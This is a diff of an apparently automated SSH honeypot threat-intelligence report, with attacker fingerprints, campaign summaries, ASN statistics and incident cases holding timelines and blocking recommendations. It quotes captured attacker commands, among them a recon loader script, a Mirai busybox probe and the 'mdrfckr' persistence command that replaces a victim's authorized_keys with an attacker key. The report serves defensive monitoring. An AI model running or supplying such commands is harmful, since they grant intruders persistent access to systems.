+| `2ec37a7cc8da...` | Mirai/variant | 56 | 1 |
+| `acaa53e0a7d7...` | Mirai/variant | 37 | 36 |
 | `419da4c91ddb...` | Modern SSH client | 24 | 1 |
-| `f555226df196...` | Mirai/variant | 13 | 5 |
-| `5bd26477da54...` | Mirai/variant | 1 | 1 |
+| `f555226df196...` | Mirai/variant | 3 | 1 |
+| `a2de0f306611...` | Mirai/variant | 2 | 1 |
 
 **Top Fingerprints:**
 
 | HASSH | Client | Sessions | IPs | Botnet Sig |
 |---|---|---|---|---|
-| `2ec37a7cc8da...` | Go SSH scanner | 59 | 2 | Mirai/variant |
-| `acaa53e0a7d7...` | OpenSSH | 36 | 34 | Mirai/variant |
+| `2ec37a7cc8da...` | Go SSH scanner | 56 | 1 | Mirai/variant |
+| `acaa53e0a7d7...` | OpenSSH | 37 | 36 | Mirai/variant |
 | `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
-| `f555226df196...` | libssh | 13 | 5 | Mirai/variant |
-| `95420f9d932d...` | libssh | 6 | 3 | — |
-| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |
-| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |
+| `95420f9d932d...` | libssh | 7 | 2 | — |
+| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
+| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
 | `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
+| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
 
 ---
 
@@ -311,16 +254,17 @@
 
 | Metric | Value |
 |---|---|
-| Total Command Clusters | **2** |
-| Campaign Clusters | **2** |
+| Total Command Clusters | **4** |
+| Campaign Clusters | **3** |
 | Highest Severity | **HIGH** |
 
 **Active Campaigns:**
 
 | Campaign | Severity | Sessions | IPs | TTPs |
 |---|---|---|---|---|
-| **Recon Loader Script** | 🟡 MEDIUM | 58 | 2 | `T1082, T1592, T1078, T1083` |
-| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |
+| **Recon Loader Script** | 🟡 MEDIUM | 56 | 1 | `T1082, T1592, T1078, T1083` |
+| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
+| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |
 
 **🟡 MEDIUM · Recon Loader Script**
 
@@ -342,7 +286,29 @@ uname -s -v -n -m 2 > /dev/null
 ```
 busybox uname -s -v -n -m 2 > /dev/null
 ```
-Source IPs: `195.178.110.232`, `195.178.110.228`
+Source IPs: `195.178.110.232`
+
+**🔴 HIGH · Mirai/IoT Botnet**
+
+> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.
+
+Representative commands:
+```
+enable
+```
+```
+system
+```
+```
+shell
+```
+```
+sh
+```
+```
+cat /proc/mounts; /bin/busybox EWSTE
+```
+Source IPs: `195.158.88.156`
 
 **🔴 HIGH · mdrfckr SSH Key Injection**
 
@@ -355,7 +321,7 @@ cd ~; chattr -ia .ssh; lockr -ia .ssh
 ```
 cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
 ```
-Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.139`, `51.68.151.167`
+Source IPs: `173.249.52.138`
 
 ---
 
@@ -363,40 +329,1629 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Metric | Value |
 |---|---|
-| Total IPs Analysed | **72** |
-| Unique ASNs | **58** |
-| High-Risk ASNs | **49** |
+| Total IPs Analysed | **78** |
+| Unique ASNs | **71** |
+| High-Risk ASNs | **57** |
 | Anon Infrastructure ASNs | **0** |
 
 **Top Attack ASNs:**
 
 | ASN | Provider | IPs | Risk |
 |---|---|---|---|
-| `AS4837` | CHINA UNICOM China169 Backbone | 5 | HIGH |
-| `AS48090` | TECHOFF SRV LIMITED | 3 | HIGH |
-| `AS398324` | Censys, Inc. | 3 | HIGH |
-| `AS4760` | HKT Limited | 3 | HIGH |
-| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 2 | HIGH |
-| `AS58224` | Iran Telecommunication Company PJS | 2 | HIGH |
-| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
-| `AS3301` | Telia Company AB | 2 | HIGH |
+| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
+| `AS396982` | Google LLC | 3 | LOW |
+| `AS3786` | LG DACOM Corporation | 2 | HIGH |
+| `AS6849` | JSC Ukrtelecom | 2 | HIGH |
+| `AS266705` | GABRIEL FRANCISCO ERBETTA Y MARIANO ANDRES CARRIZO RICHELET SOCIEDAD DE HECHO (TELNET SOLUCIONES) | 2 | HIGH |
+| `AS15735` | GO p.l.c. | 1 | HIGH |
+| `AS58224` | Iran Telecommunication Company PJS | 1 | HIGH |
+| `AS43273` | Optik Line LLC | 1 | LOW |
 
 ---
 
 ---
 
-## 🚨 Priority Cases — Immediate Attention (183)
+## 🚨 Priority Cases — Immediate Attention (125)
 
 > Cases with auth success, command execution, or file downloads.
 > Each requires individual review. Never grouped.
 
-### 🔴 HIGH · IR-ffdaa4dbb346
+### 🔴 HIGH · IR-bbf16d8d3418
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 12:56 |
-| **Last Seen** | 2026-08-22 12:56 |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 14:56 |
+| **Last Seen** | 2026-08-22 14:56 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 14:56:19` | `cowrie.session.connect` |
+| `2026-08-22 14:56:20` | `cowrie.client.version` |
+| `2026-08-22 14:56:20` | `cowrie.client.kex` |
+| `2026-08-22 14:56:21` | `cowrie.login.success` |
+| `2026-08-22 14:56:22` | `cowrie.session.params` |
+| `2026-08-22 14:56:22` | `cowrie.command.input` |
+| `2026-08-22 14:56:22` | `cowrie.command.input` |
+| `2026-08-22 14:56:22` | `cowrie.command.input` |
+| `2026-08-22 14:56:22` | `cowrie.command.input` |
+| `2026-08-22 14:56:22` | `cowrie.command.input` |
+| `2026-08-22 14:56:22` | `cowrie.command.success` |
+| `2026-08-22 14:56:22` | `cowrie.command.input` |
+| `2026-08-22 14:56:22` | `cowrie.command.input` |
+| `2026-08-22 14:56:22` | `cowrie.command.input` |
+| `2026-08-22 14:56:22` | `cowrie.command.input` |
+| `2026-08-22 14:56:22` | `cowrie.log.closed` |
+| `2026-08-22 14:56:24` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-71658c600af2
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `42.248.129[.]234` |
+| **First Seen** | 2026-08-22 14:56 |
+| **Last Seen** | 2026-08-22 14:56 |
+| **Session Duration** | 9s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 14:56:36` | `cowrie.session.connect` |
+| `2026-08-22 14:56:37` | `cowrie.client.version` |
+| `2026-08-22 14:56:37` | `cowrie.client.kex` |
+| `2026-08-22 14:56:39` | `cowrie.login.success` |
+| `2026-08-22 14:56:40` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 14:56:46` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `42.248.129[.]234` to AbuseIPDB if not already reported
+- [ ] Block `42.248.129[.]234` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-5715068d0073
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `46.201.247[.]21` |
+| **First Seen** | 2026-08-22 14:56 |
+| **Last Seen** | 2026-08-22 14:56 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 14:56:46` | `cowrie.session.connect` |
+| `2026-08-22 14:56:47` | `cowrie.client.version` |
+| `2026-08-22 14:56:47` | `cowrie.client.kex` |
+| `2026-08-22 14:56:48` | `cowrie.login.success` |
+| `2026-08-22 14:56:48` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 14:56:53` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
+- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-0f22b9d59b53
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 14:58 |
+| **Last Seen** | 2026-08-22 14:58 |
+| **Session Duration** | 8s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 14:58:26` | `cowrie.session.connect` |
+| `2026-08-22 14:58:27` | `cowrie.client.version` |
+| `2026-08-22 14:58:27` | `cowrie.client.kex` |
+| `2026-08-22 14:58:30` | `cowrie.login.success` |
+| `2026-08-22 14:58:32` | `cowrie.session.params` |
+| `2026-08-22 14:58:32` | `cowrie.command.input` |
+| `2026-08-22 14:58:32` | `cowrie.command.input` |
+| `2026-08-22 14:58:32` | `cowrie.command.input` |
+| `2026-08-22 14:58:32` | `cowrie.command.input` |
+| `2026-08-22 14:58:32` | `cowrie.command.input` |
+| `2026-08-22 14:58:32` | `cowrie.command.success` |
+| `2026-08-22 14:58:32` | `cowrie.command.input` |
+| `2026-08-22 14:58:32` | `cowrie.command.input` |
+| `2026-08-22 14:58:32` | `cowrie.command.input` |
+| `2026-08-22 14:58:32` | `cowrie.command.input` |
+| `2026-08-22 14:58:33` | `cowrie.log.closed` |
+| `2026-08-22 14:58:34` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-86b010e57f39
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 14:59 |
+| **Last Seen** | 2026-08-22 14:59 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 14:59:32` | `cowrie.session.connect` |
+| `2026-08-22 14:59:32` | `cowrie.client.version` |
+| `2026-08-22 14:59:32` | `cowrie.client.kex` |
+| `2026-08-22 14:59:33` | `cowrie.login.success` |
+| `2026-08-22 14:59:33` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 14:59:33` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 14:59:33` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 14:59:34` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-b4eb8476674d
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 14:59 |
+| **Last Seen** | 2026-08-22 14:59 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 14:59:41` | `cowrie.session.connect` |
+| `2026-08-22 14:59:41` | `cowrie.client.version` |
+| `2026-08-22 14:59:42` | `cowrie.client.kex` |
+| `2026-08-22 14:59:42` | `cowrie.login.success` |
+| `2026-08-22 14:59:43` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 14:59:43` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 14:59:43` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 14:59:43` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-3aa74b842209
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:00 |
+| **Last Seen** | 2026-08-22 15:00 |
+| **Session Duration** | 7s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:00:29` | `cowrie.session.connect` |
+| `2026-08-22 15:00:30` | `cowrie.client.version` |
+| `2026-08-22 15:00:30` | `cowrie.client.kex` |
+| `2026-08-22 15:00:32` | `cowrie.login.success` |
+| `2026-08-22 15:00:34` | `cowrie.session.params` |
+| `2026-08-22 15:00:34` | `cowrie.command.input` |
+| `2026-08-22 15:00:34` | `cowrie.command.input` |
+| `2026-08-22 15:00:34` | `cowrie.command.input` |
+| `2026-08-22 15:00:34` | `cowrie.command.input` |
+| `2026-08-22 15:00:34` | `cowrie.command.input` |
+| `2026-08-22 15:00:34` | `cowrie.command.success` |
+| `2026-08-22 15:00:34` | `cowrie.command.input` |
+| `2026-08-22 15:00:34` | `cowrie.command.input` |
+| `2026-08-22 15:00:34` | `cowrie.command.input` |
+| `2026-08-22 15:00:34` | `cowrie.command.input` |
+| `2026-08-22 15:00:35` | `cowrie.log.closed` |
+| `2026-08-22 15:00:36` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-a82495c83927
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `213.33.204[.]130` |
+| **First Seen** | 2026-08-22 15:01 |
+| **Last Seen** | 2026-08-22 15:01 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:01:42` | `cowrie.session.connect` |
+| `2026-08-22 15:01:43` | `cowrie.client.version` |
+| `2026-08-22 15:01:43` | `cowrie.client.kex` |
+| `2026-08-22 15:01:44` | `cowrie.login.success` |
+| `2026-08-22 15:01:44` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:01:49` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
+- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-634afd67166e
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:02 |
+| **Last Seen** | 2026-08-22 15:03 |
+| **Session Duration** | 14s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:02:59` | `cowrie.session.connect` |
+| `2026-08-22 15:03:00` | `cowrie.client.version` |
+| `2026-08-22 15:03:00` | `cowrie.client.kex` |
+| `2026-08-22 15:03:06` | `cowrie.login.success` |
+| `2026-08-22 15:03:11` | `cowrie.session.params` |
+| `2026-08-22 15:03:11` | `cowrie.command.input` |
+| `2026-08-22 15:03:11` | `cowrie.command.input` |
+| `2026-08-22 15:03:11` | `cowrie.command.input` |
+| `2026-08-22 15:03:11` | `cowrie.command.input` |
+| `2026-08-22 15:03:11` | `cowrie.command.input` |
+| `2026-08-22 15:03:11` | `cowrie.command.success` |
+| `2026-08-22 15:03:11` | `cowrie.command.input` |
+| `2026-08-22 15:03:11` | `cowrie.command.input` |
+| `2026-08-22 15:03:11` | `cowrie.command.input` |
+| `2026-08-22 15:03:11` | `cowrie.command.input` |
+| `2026-08-22 15:03:12` | `cowrie.log.closed` |
+| `2026-08-22 15:03:13` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-5d01c90071e1
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:04 |
+| **Last Seen** | 2026-08-22 15:05 |
+| **Session Duration** | 14s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:04:57` | `cowrie.session.connect` |
+| `2026-08-22 15:04:58` | `cowrie.client.version` |
+| `2026-08-22 15:04:58` | `cowrie.client.kex` |
+| `2026-08-22 15:05:04` | `cowrie.login.success` |
+| `2026-08-22 15:05:10` | `cowrie.session.params` |
+| `2026-08-22 15:05:10` | `cowrie.command.input` |
+| `2026-08-22 15:05:10` | `cowrie.command.input` |
+| `2026-08-22 15:05:10` | `cowrie.command.input` |
+| `2026-08-22 15:05:10` | `cowrie.command.input` |
+| `2026-08-22 15:05:10` | `cowrie.command.input` |
+| `2026-08-22 15:05:10` | `cowrie.command.success` |
+| `2026-08-22 15:05:10` | `cowrie.command.input` |
+| `2026-08-22 15:05:10` | `cowrie.command.input` |
+| `2026-08-22 15:05:10` | `cowrie.command.input` |
+| `2026-08-22 15:05:10` | `cowrie.command.input` |
+| `2026-08-22 15:05:11` | `cowrie.log.closed` |
+| `2026-08-22 15:05:12` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-d6dc94466b82
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:06 |
+| **Last Seen** | 2026-08-22 15:07 |
+| **Session Duration** | 14s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:06:47` | `cowrie.session.connect` |
+| `2026-08-22 15:06:48` | `cowrie.client.version` |
+| `2026-08-22 15:06:48` | `cowrie.client.kex` |
+| `2026-08-22 15:06:55` | `cowrie.login.success` |
+| `2026-08-22 15:06:59` | `cowrie.session.params` |
+| `2026-08-22 15:06:59` | `cowrie.command.input` |
+| `2026-08-22 15:06:59` | `cowrie.command.input` |
+| `2026-08-22 15:06:59` | `cowrie.command.input` |
+| `2026-08-22 15:06:59` | `cowrie.command.input` |
+| `2026-08-22 15:06:59` | `cowrie.command.input` |
+| `2026-08-22 15:06:59` | `cowrie.command.success` |
+| `2026-08-22 15:06:59` | `cowrie.command.input` |
+| `2026-08-22 15:06:59` | `cowrie.command.input` |
+| `2026-08-22 15:06:59` | `cowrie.command.input` |
+| `2026-08-22 15:06:59` | `cowrie.command.input` |
+| `2026-08-22 15:07:00` | `cowrie.log.closed` |
+| `2026-08-22 15:07:01` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-a6e3fd36850d
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:08 |
+| **Last Seen** | 2026-08-22 15:08 |
+| **Session Duration** | 14s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:08:29` | `cowrie.session.connect` |
+| `2026-08-22 15:08:31` | `cowrie.client.version` |
+| `2026-08-22 15:08:31` | `cowrie.client.kex` |
+| `2026-08-22 15:08:37` | `cowrie.login.success` |
+| `2026-08-22 15:08:42` | `cowrie.session.params` |
+| `2026-08-22 15:08:42` | `cowrie.command.input` |
+| `2026-08-22 15:08:42` | `cowrie.command.input` |
+| `2026-08-22 15:08:42` | `cowrie.command.input` |
